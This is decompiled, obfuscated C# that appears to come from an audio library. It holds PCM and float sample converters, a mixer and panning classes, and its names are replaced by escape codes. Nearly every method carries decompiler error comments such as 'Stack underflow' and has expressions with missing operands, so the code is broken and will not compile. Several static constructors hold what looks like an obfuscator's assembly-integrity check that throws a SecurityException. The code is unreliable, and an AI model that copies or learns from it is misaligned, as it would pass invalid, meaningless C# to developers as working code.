			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0006
{
	internal sealed class _0008 : global::_0003._0005
	{
		private int m__0001;

		private byte[] m__0001;

		private int _0002;

		public bool _0001(global::_0005._0005 _0002)
		{
			//IL_0023: Incompatible stack heights: 0 vs 1
			//IL_0026: Incompatible stack heights: 0 vs 1
			//IL_0029: Incompatible stack heights: 0 vs 1
			if (((global::_0005._0005)/*Error near IL_0007: Stack underflow*/)._0001 == WaveFormatEncoding.Pcm && ((global::_0005._0005)/*Error near IL_0011: Stack underflow*/)._0003 == 24)
			{
				return ((global::_0005._0005)/*Error near IL_001c: Stack underflow*/)._0001 == 1;
			}
			return false;
		}

		public void _0001(global::_001C._0004 _0002, int _0003)
		{
			//IL_0003: Unknown result type (might be due to invalid IL or missing references)
			//IL_0036: Incompatible stack heights: 0 vs 1
			//IL_0039: Expected I4, but got Unknown
			//IL_003c: Incompatible stack heights: 0 vs 1
			int num = /*Error near IL_0004: Stack underflow*/* 3;
			byte[] array = global::_0011._0018._0001(num, this.m__0001);
			((_0008)/*Error near IL_0019: Stack underflow*/).m__0001 = array;
			this._0002 = _0002.Read(this.m__0001, 0, num);
			this.m__0001 = 0;
		}

		public unsafe bool _0001(out float _0002, out float _0003)
		{
			//IL_000e: Invalid comparison between Unknown and I4
			//IL_0072: Incompatible stack heights: 0 vs 1
			//IL_0075: Incompatible stack heights: 0 vs 2
			//IL_0078: Incompatible stack heights: 0 vs 1
			_ = ((_0008)/*Error near IL_0007: Stack underflow*/).m__0001;
			int num = ((_0008)/*Error near IL_000e: Stack underflow*/)._0002;
			if ((int)/*Error near IL_0010: Stack underflow*/ < num)
			{
				float num2 = (float)(((sbyte)this.m__0001[this.m__0001 + 2] << 16) | (this.m__0001[this.m__0001 + 1] << 8) | this.m__0001[this.m__0001]) / 8388608f;
				*(float*)(nint)/*Error near IL_004d: Stack underflow*/ = num2;
				this.m__0001 += 3;
				_0003 = _0002;
				return true;
			}
			_0002 = 0f;
			_0003 = 0f;
			return false;
		}
	}
}
namespace _001F
{
	internal sealed class _0007 : global::_0003._0005
	{
		private int m__0001;

		private byte[] m__0001;

		private int _0002;

		public bool _0001(global::_0005._0005 _0002)
		{
			//IL_0022: Incompatible stack heights: 0 vs 1
			//IL_0025: Incompatible stack heights: 0 vs 1
			//IL_0028: Incompatible stack heights: 0 vs 1
			if (((global::_0005._0005)/*Error near IL_0007: Stack underflow*/)._0001 == WaveFormatEncoding.Pcm && ((global::_0005._0005)/*Error near IL_0011: Stack underflow*/)._0003 == 8)
			{
				return ((global::_0005._0005)/*Error near IL_001b: Stack underflow*/)._0001 == 1;
			}
			return false;
		}

		public void _0001(_001C._0004 _0002, int _0003)
		{
			//IL_0034: Incompatible stack heights: 0 vs 1
			//IL_003a: Incompatible stack heights: 0 vs 1
			int num = (int)/*Error near IL_0037: Stack underflow*/;
			byte[] array = global::_0011._0018._0001(num, this.m__0001);
			((_0007)/*Error near IL_0017: Stack underflow*/).m__0001 = array;
			this._0002 = _0002.Read(this.m__0001, 0, num);
			this.m__0001 = 0;
		}

		public unsafe bool _0001(out float _0002, out float _0003)
		{
			//IL_000e: Invalid comparison between Unknown and I4
			//IL_004c: Incompatible stack heights: 0 vs 1
			//IL_004f: Incompatible stack heights: 0 vs 2
			//IL_0052: Incompatible stack heights: 0 vs 1
			_ = ((_0007)/*Error near IL_0007: Stack underflow*/).m__0001;
			int num = ((_0007)/*Error near IL_000e: Stack underflow*/)._0002;
			if ((int)/*Error near IL_0010: Stack underflow*/ < num)
			{
				float num2 = (float)(int)this.m__0001[this.m__0001] / 256f;
				*(float*)(nint)/*Error near IL_0027: Stack underflow*/ = num2;
				this.m__0001++;
				_0003 = _0002;
				return true;
			}
			_0002 = 0f;
			_0003 = 0f;
			return false;
		}

		static _0007()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0008
{
	internal sealed class _0007 : global::_0003._0005
	{
		private int m__0001;

		private byte[] m__0001;

		private _0080._0004 m__0001;

		private int _0002;

		public bool _0001(global::_0005._0005 _0002)
		{
			//IL_0018: Incompatible stack heights: 0 vs 1
			//IL_001b: Incompatible stack heights: 0 vs 1
			if (((global::_0005._0005)/*Error near IL_0007: Stack underflow*/)._0001 == WaveFormatEncoding.IeeeFloat)
			{
				return ((global::_0005._0005)/*Error near IL_0011: Stack underflow*/)._0001 == 1;
			}
			return false;
		}

		public void _0001(_001C._0004 _0002, int _0003)
		{
			//IL_0003: Unknown result type (might be due to invalid IL or missing references)
			//IL_0049: Incompatible stack heights: 0 vs 1
			//IL_004c: Expected I4, but got Unknown
			//IL_004f: Incompatible stack heights: 0 vs 1
			int num = /*Error near IL_0004: Stack underflow*/* 4;
			byte[] array = global::_0011._0018._0001(num, this.m__0001);
			((_0007)/*Error near IL_0019: Stack underflow*/).m__0001 = array;
			this.m__0001 = new _0080._0004(this.m__0001);
			this._0002 = _0002.Read(this.m__0001, 0, num) / 4;
			this.m__0001 = 0;
		}

		public unsafe bool _0001(out float _0002, out float _0003)
		{
			//IL_000e: Invalid comparison between Unknown and I4
			//IL_0047: Incompatible stack heights: 0 vs 1
			//IL_004a: Incompatible stack heights: 0 vs 2
			//IL_004d: Incompatible stack heights: 0 vs 1
			_ = ((_0007)/*Error near IL_0007: Stack underflow*/).m__0001;
			int num = ((_0007)/*Error near IL_000e: Stack underflow*/)._0002;
			if ((int)/*Error near IL_0010: Stack underflow*/ < num)
			{
				float num2 = this.m__0001.FloatBuffer[this.m__0001++];
				*(float*)(nint)/*Error near IL_0030: Stack underflow*/ = num2;
				_0003 = _0002;
				return true;
			}
			_0002 = 0f;
			_0003 = 0f;
			return false;
		}
	}
}
namespace _0019
{
	internal sealed class _0008 : global::_0003._0005
	{
		private int m__0001;

		private byte[] m__0001;

		private global::_0080._0004 m__0001;

		private int _0002;

		public bool _0001(global::_0005._0005 _0002)
		{
			//IL_0023: Incompatible stack heights: 0 vs 1
			//IL_0026: Incompatible stack heights: 0 vs 1
			//IL_0029: Incompatible stack heights: 0 vs 1
			if (((global::_0005._0005)/*Error near IL_0007: Stack underflow*/)._0001 == WaveFormatEncoding.Pcm && ((global::_0005._0005)/*Error near IL_0011: Stack underflow*/)._0003 == 16)
			{
				return ((global::_0005._0005)/*Error near IL_001c: Stack underflow*/)._0001 == 2;
			}
			return false;
		}

		public void _0001(global::_001C._0004 _0002, int _0003)
		{
			//IL_0003: Unknown result type (might be due to invalid IL or missing references)
			//IL_0049: Incompatible stack heights: 0 vs 1
			//IL_004c: Expected I4, but got Unknown
			//IL_004f: Incompatible stack heights: 0 vs 1
			int num = /*Error near IL_0004: Stack underflow*/* 4;
			byte[] array = global::_0011._0018._0001(num, this.m__0001);
			((_0008)/*Error near IL_0019: Stack underflow*/).m__0001 = array;
			this.m__0001 = new global::_0080._0004(this.m__0001);
			this._0002 = _0002.Read(this.m__0001, 0, num) / 2;
			this.m__0001 = 0;
		}

		public unsafe bool _0001(out float _0002, out float _0003)
		{
			//IL_000e: Invalid comparison between Unknown and I4
			//IL_0070: Incompatible stack heights: 0 vs 1
			//IL_0073: Incompatible stack heights: 0 vs 2
			//IL_0076: Incompatible stack heights: 0 vs 1
			_ = ((_0008)/*Error near IL_0007: Stack underflow*/).m__0001;
			int num = ((_0008)/*Error near IL_000e: Stack underflow*/)._0002;
			if ((int)/*Error near IL_0010: Stack underflow*/ < num)
			{
				float num2 = (float)this.m__0001.ShortBuffer[this.m__0001++] / 32768f;
				*(float*)(nint)/*Error near IL_0037: Stack underflow*/ = num2;
				_0003 = (float)this.m__0001.ShortBuffer[this.m__0001++] / 32768f;
				return true;
			}
			_0002 = 0f;
			_0003 = 0f;
			return false;
		}

		static _0008()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(global::_0080._0014._0001(107396706));
		}
	}
}
namespace _0012
{
	internal sealed class _0006 : global::_0003._0005
	{
		private int m__0001;

		private byte[] m__0001;

		private int _0002;

		public bool _0001(global::_0005._0005 _0002)
		{
			//IL_0023: Incompatible stack heights: 0 vs 1
			//IL_0026: Incompatible stack heights: 0 vs 1
			//IL_0029: Incompatible stack heights: 0 vs 1
			if (((global::_0005._0005)/*Error near IL_0007: Stack underflow*/)._0001 == WaveFormatEncoding.Pcm && ((global::_0005._0005)/*Error near IL_0011: Stack underflow*/)._0003 == 24)
			{
				return ((global::_0005._0005)/*Error near IL_001c: Stack underflow*/)._0001 == 2;
			}
			return false;
		}

		public void _0001(_001C._0004 _0002, int _0003)
		{
			//IL_0003: Unknown result type (might be due to invalid IL or missing references)
			//IL_0036: Incompatible stack heights: 0 vs 1
			//IL_0039: Expected I4, but got Unknown
			//IL_003c: Incompatible stack heights: 0 vs 1
			int num = /*Error near IL_0004: Stack underflow*/* 6;
			byte[] array = global::_0011._0018._0001(num, this.m__0001);
			((_0006)/*Error near IL_0019: Stack underflow*/).m__0001 = array;
			this._0002 = _0002.Read(this.m__0001, 0, num);
			this.m__0001 = 0;
		}

		public unsafe bool _0001(out float _0002, out float _0003)
		{
			//IL_0014: Invalid comparison between Unknown and I4
			//IL_00c4: Incompatible stack heights: 0 vs 1
			//IL_00ca: Incompatible stack heights: 0 vs 2
			//IL_00d0: Incompatible stack heights: 0 vs 1
			_ = ((_0006)/*Error near IL_000a: Stack underflow*/).m__0001;
			int num = ((_0006)/*Error near IL_0014: Stack underflow*/)._0002;
			if ((int)/*Error near IL_0019: Stack underflow*/ < num)
			{
				float num2 = (float)(((sbyte)this.m__0001[this.m__0001 + 2] << 16) | (this.m__0001[this.m__0001 + 1] << 8) | this.m__0001[this.m__0001]) / 8388608f;
				*(float*)(nint)/*Error near IL_0059: Stack underflow*/ = num2;
				this.m__0001 += 3;
				_0003 = (float)(((sbyte)this.m__0001[this.m__0001 + 2] << 16) | (this.m__0001[this.m__0001 + 1] << 8) | this.m__0001[this.m__0001]) / 8388608f;
				this.m__0001 += 3;
				return true;
			}
			_0002 = 0f;
			_0003 = 0f;
			return false;
		}
	}
}
namespace _0010
{
	internal sealed class _0007 : global::_0003._0005
	{
		private int m__0001;

		private byte[] m__0001;

		private int _0002;

		public bool _0001(global::_0005._0005 _0002)
		{
			//IL_0022: Incompatible stack heights: 0 vs 1
			//IL_0025: Incompatible stack heights: 0 vs 1
			//IL_0028: Incompatible stack heights: 0 vs 1
			if (((global::_0005._0005)/*Error near IL_0007: Stack underflow*/)._0001 == WaveFormatEncoding.Pcm && ((global::_0005._0005)/*Error near IL_0011: Stack underflow*/)._0003 == 8)
			{
				return ((global::_0005._0005)/*Error near IL_001b: Stack underflow*/)._0001 == 2;
			}
			return false;
		}

		public void _0001(global::_001C._0004 _0002, int _0003)
		{
			//IL_0003: Unknown result type (might be due to invalid IL or missing references)
			//IL_0036: Incompatible stack heights: 0 vs 1
			//IL_0039: Expected I4, but got Unknown
			//IL_003c: Incompatible stack heights: 0 vs 1
			int num = /*Error near IL_0004: Stack underflow*/* 2;
			byte[] array = global::_0011._0018._0001(num, this.m__0001);
			((_0007)/*Error near IL_0019: Stack underflow*/).m__0001 = array;
			this._0002 = _0002.Read(this.m__0001, 0, num);
			this.m__0001 = 0;
		}

		public unsafe bool _0001(out float _0002, out float _0003)
		{
			//IL_000e: Invalid comparison between Unknown and I4
			//IL_0066: Incompatible stack heights: 0 vs 1
			//IL_0069: Incompatible stack heights: 0 vs 2
			//IL_006c: Incompatible stack heights: 0 vs 1
			_ = ((_0007)/*Error near IL_0007: Stack underflow*/).m__0001;
			int num = ((_0007)/*Error near IL_000e: Stack underflow*/)._0002;
			if ((int)/*Error near IL_0010: Stack underflow*/ < num)
			{
				float num2 = (float)(int)this.m__0001[this.m__0001++] / 256f;
				*(float*)(nint)/*Error near IL_0032: Stack underflow*/ = num2;
				_0003 = (float)(int)this.m__0001[this.m__0001++] / 256f;
				return true;
			}
			_0002 = 0f;
			_0003 = 0f;
			return false;
		}

		static _0007()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(global::_0080._0014._0001(107396706));
		}
	}
}
namespace _0011
{
	internal sealed class _0007 : global::_0003._0005
	{
		private int m__0001;

		private byte[] m__0001;

		private _0080._0004 m__0001;

		private int _0002;

		public bool _0001(global::_0005._0005 _0002)
		{
			//IL_0018: Incompatible stack heights: 0 vs 1
			//IL_001b: Incompatible stack heights: 0 vs 1
			if (((global::_0005._0005)/*Error near IL_0007: Stack underflow*/)._0001 == WaveFormatEncoding.IeeeFloat)
			{
				return ((global::_0005._0005)/*Error near IL_0011: Stack underflow*/)._0001 == 2;
			}
			return false;
		}

		public void _0001(_001C._0004 _0002, int _0003)
		{
			//IL_0003: Unknown result type (might be due to invalid IL or missing references)
			//IL_0049: Incompatible stack heights: 0 vs 1
			//IL_004c: Expected I4, but got Unknown
			//IL_004f: Incompatible stack heights: 0 vs 1
			int num = /*Error near IL_0004: Stack underflow*/* 8;
			byte[] array = _0018._0001(num, this.m__0001);
			((_0007)/*Error near IL_0019: Stack underflow*/).m__0001 = array;
			this.m__0001 = new _0080._0004(this.m__0001);
			this._0002 = _0002.Read(this.m__0001, 0, num) / 4;
			this.m__0001 = 0;
		}

		public unsafe bool _0001(out float _0002, out float _0003)
		{
			//IL_000e: Invalid comparison between Unknown and I4
			//IL_0062: Incompatible stack heights: 0 vs 1
			//IL_0065: Incompatible stack heights: 0 vs 2
			//IL_0068: Incompatible stack heights: 0 vs 1
			_ = ((_0007)/*Error near IL_0007: Stack underflow*/).m__0001;
			int num = ((_0007)/*Error near IL_000e: Stack underflow*/)._0002;
			if ((int)/*Error near IL_0010: Stack underflow*/ < num)
			{
				float num2 = this.m__0001.FloatBuffer[this.m__0001++];
				*(float*)(nint)/*Error near IL_0030: Stack underflow*/ = num2;
				_0003 = this.m__0001.FloatBuffer[this.m__0001++];
				return true;
			}
			_0002 = 0f;
			_0003 = 0f;
			return false;
		}
	}
}
namespace _0017
{
	internal sealed class _0011 : global::_0002._0007
	{
		internal readonly List<global::_0002._0007> _0001;

		private float[] m__0001;

		private const int m__0001 = 1024;

		[CompilerGenerated]
		private bool m__0001;

		[CompilerGenerated]
		private EventHandler<global::_0002._0010> m__0001;

		[CompilerGenerated]
		private global::_0005._0005 m__0001;

		public IEnumerable<global::_0002._0007> MixerInputs => ((_0011)/*Error near IL_0007: Stack underflow*/)._0001;

		public bool ReadFully
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0011)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0011)/*Error near IL_0009: Stack underflow*/).m__0001 = (byte)/*Error near IL_0009: Stack underflow*/ != 0;
			}
		}

		public global::_0005._0005 WaveFormat
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0011)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			[CompilerGenerated]
			private set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0011)/*Error near IL_0009: Stack underflow*/).m__0001 = (global::_0005._0005)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public event EventHandler<global::_0002._0010> MixerInputEnded
		{
			[CompilerGenerated]
			add
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				EventHandler<global::_0002._0010> eventHandler = ((_0011)/*Error near IL_0007: Stack underflow*/).m__0001;
				EventHandler<global::_0002._0010> eventHandler2;
				do
				{
					eventHandler2 = (EventHandler<global::_0002._0010>)/*Error near IL_000c: Stack underflow*/;
					EventHandler<global::_0002._0010> value2 = (EventHandler<global::_0002._0010>)Delegate.Combine(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this.m__0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
			[CompilerGenerated]
			remove
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				EventHandler<global::_0002._0010> eventHandler = ((_0011)/*Error near IL_0007: Stack underflow*/).m__0001;
				EventHandler<global::_0002._0010> eventHandler2;
				do
				{
					eventHandler2 = (EventHandler<global::_0002._0010>)/*Error near IL_000c: Stack underflow*/;
					EventHandler<global::_0002._0010> value2 = (EventHandler<global::_0002._0010>)Delegate.Remove(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this.m__0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
		}

		public _0011(global::_0005._0005 _0099_008F_0006)
		{
			if (_0099_008F_0006._0001 != WaveFormatEncoding.IeeeFloat)
			{
				throw new ArgumentException(global::_0080._0014._0001(107384536));
			}
			this._0001 = new List<global::_0002._0007>();
			WaveFormat = _0099_008F_0006;
		}

		public _0011(IEnumerable<global::_0002._0007> _0092_0090_0006)
		{
			this._0001 = new List<global::_0002._0007>();
			foreach (global::_0002._0007 item in _0092_0090_0006)
			{
				_0001(item);
			}
			if (this._0001.Count == 0)
			{
				throw new ArgumentException(global::_0080._0014._0001(107384455));
			}
		}

		public void _0001(global::_0002._0007 _0002)
		{
			//IL_00b1: Incompatible stack heights: 0 vs 1
			//IL_00bd: Incompatible stack heights: 0 vs 2
			List<global::_0002._0007> list = ((_0011)/*Error near IL_000a: Stack underflow*/)._0001;
			_ = _0091_0002._009C_0005;
			/*Error near IL_001e: Stack underflow*/((object)/*Error near IL_001e: Stack underflow*/);
			try
			{
				if (this._0001.Count >= 1024)
				{
					throw new InvalidOperationException(global::_0080._0014._0001(107384386));
				}
				this._0001.Add(_0002);
			}
			finally
			{
				_0091_0002._009D_0005(list);
			}
			if (WaveFormat == null)
			{
				WaveFormat = _0002.WaveFormat;
			}
			else if (WaveFormat._0001 != _0002.WaveFormat._0001 || WaveFormat._0001 != _0002.WaveFormat._0001)
			{
				throw new ArgumentException(global::_0080._0014._0001(107384357));
			}
		}

		public int _0001(float[] _0002, int _0003, int _0004)
		{
			//IL_012c: Incompatible stack heights: 0 vs 1
			//IL_0132: Incompatible stack heights: 0 vs 1
			int num = 0;
			float[] obj2 = global::_0011._0018._0001(_0003: this.m__0001, _0002: (int)/*Error near IL_001b: Stack underflow*/);
			((_0011)/*Error near IL_0020: Stack underflow*/).m__0001 = obj2;
			List<global::_0002._0007> list = this._0001;
			_0091_0002._009C_0005(list);
			try
			{
				for (int num2 = this._0001.Count - 1; num2 >= 0; num2--)
				{
					global::_0002._0007 obj3 = this._0001[num2];
					int num3 = obj3._0001(this.m__0001, 0, _0004);
					int num4 = _0003;
					for (int i = 0; i < num3; i++)
					{
						if (i >= num)
						{
							_0002[num4++] = this.m__0001[i];
						}
						else
						{
							_0002[num4++] += this.m__0001[i];
						}
					}
					num = _0016_0002._0019_0005(num3, num);
					if (num3 < _0004)
					{
						this.m__0001?.Invoke(this, new global::_0002._0010(obj3));
						this._0001.RemoveAt(num2);
					}
				}
			}
			finally
			{
				_0091_0002._009D_0005(list);
			}
			if (ReadFully && num < _0004)
			{
				int num5 = _0003 + num;
				while (num5 < _0003 + _0004)
				{
					_0002[num5++] = 0f;
				}
				num = _0004;
			}
			return num;
		}

		static _0011()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(global::_0080._0014._0001(107396706));
		}
	}
}
namespace _0002
{
	internal sealed class _0010 : EventArgs
	{
		[CompilerGenerated]
		private _0007 _0001;

		public _0007 SampleProvider
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0010)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			private set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0010)/*Error near IL_0009: Stack underflow*/)._0001 = (_0007)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public _0010(_0007 _0093_0090_0006)
		{
			SampleProvider = _0093_0090_0006;
		}
	}
}
namespace _001B
{
	internal sealed class _0010 : global::_0002._0007
	{
		private readonly global::_0002._0007 m__0001;

		internal float _0001;

		internal float _0002;

		internal float _0003;

		private readonly global::_0005._0005 m__0001;

		private float[] m__0001;

		internal global::_0015._000F _0001;

		public float Pan
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0010)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_0007: Invalid comparison between Unknown and F4
				//IL_0010: Invalid comparison between Unknown and F4
				//IL_0038: Incompatible stack heights: 0 vs 1
				//IL_003b: Incompatible stack heights: 0 vs 1
				//IL_0042: Incompatible stack heights: 0 vs 1
				if ((float)/*Error near IL_0009: Stack underflow*/ < -1f || !((float)/*Error near IL_0012: Stack underflow*/ <= 1f))
				{
					_0080._0014._0001(107388827);
					throw new ArgumentOutOfRangeException(message: _0080._0014._0001(107384787), paramName: (string?)/*Error near IL_0028: Stack underflow*/);
				}
				this._0001 = value;
				global::_0011._0018._0001(this);
			}
		}

		public global::_0015._000F PanStrategy
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0010)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_0012: Incompatible stack heights: 0 vs 1
				//IL_0015: Incompatible stack heights: 0 vs 1
				//IL_0018: Incompatible stack heights: 0 vs 1
				((_0010)/*Error near IL_0009: Stack underflow*/)._0001 = (global::_0015._000F)/*Error near IL_0009: Stack underflow*/;
				global::_0011._0018._0001((_0010)/*Error near IL_0010: Stack underflow*/);
			}
		}

		public global::_0005._0005 WaveFormat => ((_0010)/*Error near IL_0007: Stack underflow*/).m__0001;

		public _0010(global::_0002._0007 _001D_0013)
		{
			if (_001D_0013.WaveFormat._0001 != 1)
			{
				throw new ArgumentException(_0080._0014._0001(107384804));
			}
			this.m__0001 = _001D_0013;
			this.m__0001 = global::_0011._0018._0001(_001D_0013.WaveFormat._0001, 2);
			this._0001 = new global::_0012._0007();
		}

		public int _0001(float[] _0002, int _0003, int _0004)
		{
			//IL_0003: Unknown result type (might be due to invalid IL or missing references)
			//IL_006c: Incompatible stack heights: 0 vs 1
			//IL_006f: Expected I4, but got Unknown
			//IL_0072: Incompatible stack heights: 0 vs 1
			int num = /*Error near IL_0004: Stack underflow*// 2;
			float[] array = global::_0011._0018._0001(num, this.m__0001);
			((_0010)/*Error near IL_0019: Stack underflow*/).m__0001 = array;
			int num2 = this.m__0001._0001(this.m__0001, 0, num);
			int num3 = _0003;
			for (int i = 0; i < num2; i++)
			{
				_0002[num3++] = this._0002 * this.m__0001[i];
				_0002[num3++] = this._0003 * this.m__0001[i];
			}
			return num2 * 2;
		}

		static _0010()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _001D
{
	internal struct _000F
	{
		[CompilerGenerated]
		private float _0001;

		[CompilerGenerated]
		private float _0002;

		public unsafe float Left
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_000F)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_000F*)(nint)/*Error near IL_0009: Stack underflow*/)->_0001 = (float)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public unsafe float Right
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_000F)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_000F*)(nint)/*Error near IL_0009: Stack underflow*/)->_0002 = (float)/*Error near IL_0009: Stack underflow*/;
			}
		}
	}
}
namespace _0015
{
	internal interface _000F
	{
		_001D._000F _0001(float _0002);
	}
}
namespace _0018
{
	internal sealed class _0010 : global::_0015._000F
	{
		public global::_001D._000F _0001(float _0002)
		{
			//IL_0007: Invalid comparison between Unknown and F4
			//IL_0010: Unknown result type (might be due to invalid IL or missing references)
			//IL_0016: Unknown result type (might be due to invalid IL or missing references)
			//IL_0058: Incompatible stack heights: 0 vs 1
			//IL_005b: Incompatible stack heights: 0 vs 2
			float num;
			if (!((float)/*Error near IL_0009: Stack underflow*/ <= 0f))
			{
				_ = 1f;
				num = (/*Error near IL_0011: Stack underflow*/ - /*Error near IL_0011: Stack underflow*/) / 2f;
			}
			else
			{
				num = 1f;
			}
			float num2 = num;
			float num3 = ((_0002 >= 0f) ? 1f : ((_0002 + 1f) / 2f));
			global::_001D._000F result = default(global::_001D._000F);
			result.Left = num2;
			result.Right = num3;
			return result;
		}
	}
}
namespace _0003
{
	internal sealed class _0006 : global::_0015._000F
	{
		public _001D._000F _0001(float _0002)
		{
			//IL_0002: Unsupported input type for neg.
			//IL_0002: Unknown result type (might be due to invalid IL or missing references)
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Unknown result type (might be due to invalid IL or missing references)
			//IL_004f: Incompatible stack heights: 0 vs 1
			//IL_0052: Expected F4, but got Unknown
			//IL_0055: Incompatible stack heights: 0 vs 2
			float num = (0 - /*Error near IL_0003: Stack underflow*/+ 1f) / 2f;
			_ = global::_0015._009F_0002;
			double num2 = (double)/*Error near IL_0019: Stack underflow*/;
			float num3 = (float)/*Error near IL_001e: Stack underflow*/(num2);
			float num4 = (float)global::_0015._009F_0002(1f - num);
			_001D._000F result = default(_001D._000F);
			result.Left = num3;
			result.Right = num4;
			return result;
		}

		static _0006()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
